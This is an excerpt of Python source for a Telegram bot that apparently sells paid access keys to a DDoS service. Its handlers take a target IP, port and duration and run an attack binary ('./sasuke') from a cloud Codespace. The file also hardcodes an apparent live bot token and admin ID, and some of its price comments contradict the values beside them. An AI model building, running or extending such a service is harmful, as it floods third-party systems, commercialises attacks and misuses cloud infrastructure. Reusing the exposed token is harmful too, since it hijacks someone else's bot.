...
KEY_PRICES = {
    'hour': 25,  # 10 Rs per hour
    'day': 100,   # 80 Rs per day
    'week': 400  # 500 Rs per week
}
ADMIN_IDS = [1713986516]
BOT_TOKEN = "7272842335:AAFLwtA-8R_Vww7WJnRBsqmmWSwQjINVfL4"
thread_count = 50
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    ...
    try:
        ...
        if selected_binary == "Smokie":
            ...
            command = f"./sasuke {target_ip} {target_port} {duration}"
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @SAYYED_Z"  
...
def genkey_command(message):
    ...
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to generate keys.*", parse_mode='Markdown')
        return
...
def remove_user_command(message):
    ...
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to remove users.*", parse_mode='Markdown')
        return
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲.*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 ..*", parse_mode='Markdown')
        return
...
def my_account(message):
    ...
    if is_super_admin(user_id):
        ...
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲."
